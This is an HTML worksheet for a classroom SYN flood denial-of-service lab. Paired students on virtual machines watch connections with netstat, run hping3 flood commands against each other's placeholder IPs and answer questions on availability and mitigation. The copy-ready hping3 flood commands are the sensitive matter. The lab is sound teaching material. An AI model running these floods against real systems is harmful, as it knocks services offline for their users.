@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 8.1.2 - SYN Flood DoS Attack</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            bg: '#0f172a',
+                            card: '#1e293b',
+                            text: '#e2e8f0',
+                            accent: '#38bdf8',
+                            border: '#334155',
+                            success: '#22c55e',
+                            danger: '#ef4444'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #e2e8f0;
+        }
+        
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e293b;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #475569;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #64748b;
+        }
+
+        /* Print Styles */
+        @media print {
+            body {
+                background-color: white;
+                color: black;
+            }
+            .no-print {
+                display: none !important;
+            }
+            .cyber-card {
+                background-color: white !important;
+                border: 1px solid #ccc !important;
+                box-shadow: none !important;
+                color: black !important;
+                break-inside: avoid;
+            }
+            .cyber-input, .cyber-textarea {
+                background-color: white !important;
+                border: 1px solid #ccc !important;
+                color: black !important;
+            }
+            code {
+                background-color: #f1f1f1 !important;
+                color: black !important;
+                border: 1px solid #ddd;
+            }
+            .text-cyber-accent {
+                color: #000 !important;
+            }
+            h1, h2, h3 {
+                color: #000 !important;
+            }
+            /* Ensure the uploaded image prints */
+            #preview-container img {
+                max-height: 300px;
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen p-4 md:p-8 font-sans">
+
+    <!-- Top Navigation / Actions -->
+    <div class="max-w-4xl mx-auto mb-6 flex justify-between items-center no-print">
+        <div class="text-sm text-slate-400">Cybersecurity Lab Worksheet</div>
+        <div class="flex gap-3">
+            <button onclick="window.print()" class="flex items-center gap-2 bg-cyber-accent text-slate-900 px-4 py-2 rounded-md font-bold hover:bg-sky-400 transition-colors">
+                <i data-lucide="printer" class="w-4 h-4"></i> Save as PDF
+            </button>
+        </div>
+    </div>
+
+    <!-- Main Worksheet Container -->
+    <div class="max-w-4xl mx-auto bg-cyber-bg md:bg-cyber-card md:border md:border-cyber-border rounded-xl shadow-2xl overflow-hidden cyber-card">
+        
+        <!-- Header Section -->
+        <header class="bg-gradient-to-r from-blue-900 to-slate-900 p-8 border-b border-cyber-border">
+            <div class="flex justify-between items-start flex-col md:flex-row gap-4">
+                <div>
+                    <h1 class="text-3xl font-bold text-white mb-2">Lab 8.1.2: SYN Flood DoS Attack</h1>
+                    <p class="text-slate-300">Objective: Demonstrate how a Denial of Service attack affects availability of services and data.</p>
+                </div>
+                <div class="bg-cyber-card/50 p-4 rounded-lg border border-cyber-border w-full md:w-auto min-w-[250px]">
+                    <h3 class="text-xs uppercase tracking-wider text-slate-400 font-bold mb-3">Student Details</h3>
+                    <div class="space-y-3">
+                        <input type="text" placeholder="Your Name" class="w-full bg-slate-800 border border-slate-600 rounded px-3 py-1.5 text-sm focus:outline-none focus:border-cyber-accent cyber-input placeholder-slate-500">
+                        <input type="text" placeholder="Date" class="w-full bg-slate-800 border border-slate-600 rounded px-3 py-1.5 text-sm focus:outline-none focus:border-cyber-accent cyber-input placeholder-slate-500">
+                        <input type="text" placeholder="Partner's Name" class="w-full bg-slate-800 border border-slate-600 rounded px-3 py-1.5 text-sm focus:outline-none focus:border-cyber-accent cyber-input placeholder-slate-500">
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="p-8 space-y-10">
+            
+            <!-- Part 1 -->
+            <section class="cyber-card">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center text-blue-400 font-bold border border-blue-500/50">1</div>
+                    <h2 class="text-xl font-bold text-white">Normal Web Connection</h2>
+                </div>
+                
+                <div class="pl-11 space-y-6">
+                    <div class="bg-slate-800/50 p-4 rounded-lg border border-cyber-border">
+                        <h3 class="text-sm font-bold text-cyber-accent mb-2 uppercase tracking-wide">Instructions</h3>
+                        <ul class="list-disc list-inside text-slate-300 space-y-2 text-sm">
+                            <li><strong>Student 1 & 2:</strong> Open a terminal on your Kali VMs and identify your IP addresses.</li>
+                            <li><strong>Student 2:</strong> Run the command below to monitor connections.</li>
+                        </ul>
+                        
+                        <div class="mt-4 relative group">
+                            <div class="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity no-print">
+                                <button onclick="copyToClipboard('cmd1')" class="bg-slate-700 hover:bg-slate-600 text-white p-1.5 rounded text-xs flex items-center gap-1 border border-slate-500">
+                                    <i data-lucide="copy" class="w-3 h-3"></i> Copy
+                                </button>
+                            </div>
+                            <code id="cmd1" class="block bg-black p-3 rounded border border-slate-700 text-green-400 font-mono text-sm">netstat –atn | less</code>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-semibold text-slate-200 mb-2">
+                            Locate the connection where the State is <span class="text-green-400 font-mono">"ESTABLISHED"</span>. What is the source IP address (Foreign Address)?
+                        </label>
+                        <input type="text" class="w-full bg-slate-800 border border-slate-600 rounded-md px-4 py-3 focus:outline-none focus:border-cyber-accent transition-colors cyber-input" placeholder="Enter IP Address here...">
+                        <p class="text-xs text-slate-500 mt-2 italic">* This IP belongs to the Range server allowing VM access.</p>
+                    </div>
+                </div>
+            </section>
+
+            <hr class="border-cyber-border">
+
+            <!-- Part 2 -->
+            <section class="cyber-card">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-8 h-8 rounded-full bg-red-500/20 flex items-center justify-center text-red-400 font-bold border border-red-500/50">2</div>
+                    <h2 class="text-xl font-bold text-white">The SYN Flood Attack</h2>
+                </div>
+
+                <div class="pl-11 space-y-6">
+                    <p class="text-slate-300 text-sm">The attacker sends thousands of SYN requests without sending an ACK back, leaving the victim waiting on open connections.</p>
+                    
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="bg-slate-800/50 p-4 rounded-lg border border-cyber-border">
+                            <h3 class="text-xs font-bold text-red-400 mb-2 uppercase">Student 1 (Attacker)</h3>
+                            <p class="text-xs text-slate-400 mb-2">Target Student 2's Kali IP:</p>
+                            <div class="relative group">
+                                <div class="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity no-print">
+                                    <button onclick="copyToClipboard('cmd2')" class="bg-slate-700 hover:bg-slate-600 text-white p-1.5 rounded text-xs flex items-center gap-1 border border-slate-500">
+                                        <i data-lucide="copy" class="w-3 h-3"></i>
+                                    </button>
+                                </div>
+                                <code id="cmd2" class="block bg-black p-3 rounded border border-slate-700 text-red-400 font-mono text-xs break-all">sudo hping3 --flood –S –p 22 &lt;S2_IP&gt;</code>
+                            </div>
+                        </div>
+
+                        <div class="bg-slate-800/50 p-4 rounded-lg border border-cyber-border">
+                            <h3 class="text-xs font-bold text-blue-400 mb-2 uppercase">Student 2 (Victim)</h3>
+                            <p class="text-xs text-slate-400 mb-2">Monitor netstat continuously:</p>
+                            <div class="relative group">
+                                <div class="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity no-print">
+                                    <button onclick="copyToClipboard('cmd3')" class="bg-slate-700 hover:bg-slate-600 text-white p-1.5 rounded text-xs flex items-center gap-1 border border-slate-500">
+                                        <i data-lucide="copy" class="w-3 h-3"></i>
+                                    </button>
+                                </div>
+                                <code id="cmd3" class="block bg-black p-3 rounded border border-slate-700 text-green-400 font-mono text-xs">netstat –atn –c</code>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="border-2 border-dashed border-slate-600 rounded-lg p-6 text-center hover:bg-slate-800/50 transition-colors">
+                        <label class="block text-sm font-semibold text-slate-200 mb-2">
+                            Evidence: Upload a screenshot of the netstat output showing "SYN_RECV"
+                        </label>
+                        
+                        <!-- File Upload UI -->
+                        <div class="no-print mt-2">
+                            <input type="file" id="screenshot-upload" accept="image/*" class="hidden" onchange="previewImage(event)">
+                            <label for="screenshot-upload" class="cursor-pointer bg-cyber-accent text-slate-900 px-4 py-2 rounded font-bold text-sm inline-flex items-center gap-2 hover:bg-sky-400 transition">
+                                <i data-lucide="upload" class="w-4 h-4"></i> Select Image
+                            </label>
+                            <p class="text-xs text-slate-500 mt-2">Click to select a file from your computer.</p>
+                        </div>
+
+                        <!-- Image Preview Area -->
+                        <div id="preview-container" class="hidden mt-4">
+                            <img id="preview-img" src="" alt="Screenshot Preview" class="max-w-full h-auto max-h-[300px] mx-auto rounded border border-slate-500 shadow-lg">
+                            <button onclick="removeImage()" class="no-print mt-2 text-red-400 text-xs hover:underline">Remove Image</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <hr class="border-cyber-border">
+
+            <!-- Part 3 -->
+            <section class="cyber-card">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="w-8 h-8 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-400 font-bold border border-purple-500/50">3</div>
+                    <h2 class="text-xl font-bold text-white">Denial of Service (DoS)</h2>
+                </div>
+
+                <div class="pl-11 space-y-6">
+                    <div class="bg-slate-800/50 p-4 rounded-lg border border-cyber-border">
+                         <h3 class="text-sm font-bold text-cyber-accent mb-2 uppercase tracking-wide">Instructions</h3>
+                         <ul class="list-disc list-inside text-slate-300 space-y-2 text-sm">
+                            <li><strong>Student 2:</strong> Switch to Windows 7 VM. Add the "Clock" gadget to the desktop and enable the second hand.</li>
+                            <li><strong>Student 1:</strong> Launch the heavy attack targeting the Windows 7 IP.</li>
+                        </ul>
+                         <div class="mt-4 relative group">
+                            <div class="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity no-print">
+                                <button onclick="copyToClipboard('cmd4')" class="bg-slate-700 hover:bg-slate-600 text-white p-1.5 rounded text-xs flex items-center gap-1 border border-slate-500">
+                                    <i data-lucide="copy" class="w-3 h-3"></i> Copy
+                                </button>
+                            </div>
+                            <code id="cmd4" class="block bg-black p-3 rounded border border-slate-700 text-purple-400 font-mono text-sm break-all">sudo hping3 --flood –d 250 –S –p 80 &lt;W7_IP&gt;</code>
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-semibold text-slate-200 mb-2">
+                            Describe what happened to the clock's second hand and the system's responsiveness (Chrome, Start Menu).
+                        </label>
+                        <textarea class="w-full bg-slate-800 border border-slate-600 rounded-md px-4 py-3 focus:outline-none focus:border-cyber-accent transition-colors cyber-textarea h-24" placeholder="Type your observation here..."></textarea>
+                    </div>
+                </div>
+            </section>
+
+            <hr class="border-cyber-border">
+
+            <!-- Conclusion -->
+            <section class="cyber-card bg-slate-800/30 p-6 rounded-lg border border-cyber-border">
+                <h2 class="text-lg font-bold text-white mb-6 uppercase tracking-widest border-b border-slate-700 pb-2">Closing Analysis</h2>
+                
+                <div class="space-y-6">
+                    <div>
+                        <label class="block text-sm font-semibold text-slate-200 mb-2">
+                            1. Which part of the CIA Triad (Confidentiality, Integrity, Availability) was affected by this attack?
+                        </label>
+                        <input type="text" class="w-full bg-slate-900 border border-slate-600 rounded-md px-4 py-3 focus:outline-none focus:border-cyber-accent transition-colors cyber-input" placeholder="Your answer...">
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-semibold text-slate-200 mb-2">
+                            2. What is one method that could be used to mitigate or defend against a SYN Flood DoS attack?
+                        </label>
+                        <textarea class="w-full bg-slate-900 border border-slate-600 rounded-md px-4 py-3 focus:outline-none focus:border-cyber-accent transition-colors cyber-textarea h-20" placeholder="Your answer..."></textarea>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+
+        <!-- Footer -->
+        <footer class="bg-slate-900 border-t border-cyber-border p-6 text-center text-xs text-slate-500">
+            <p>Lab material based on CYBER.ORG curriculum.</p>
+            <p class="mt-1">Generated for educational use.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Initialize Icons
+        lucide.createIcons();
+
+        // Copy to Clipboard Function
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                // Visual feedback could be added here
+                alert("Command copied to clipboard!");
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        // Image Preview Function
+        function previewImage(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const previewContainer = document.getElementById('preview-container');
+                    const previewImg = document.getElementById('preview-img');
+                    
+                    previewImg.src = e.target.result;
+                    previewContainer.classList.remove('hidden');
+                }
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // Remove Image Function
+        function removeImage() {
+            document.getElementById('screenshot-upload').value = '';
+            document.getElementById('preview-container').classList.add('hidden');
+            document.getElementById('preview-img').src = '';
+        }
+    </script>
+</body>
+</html>
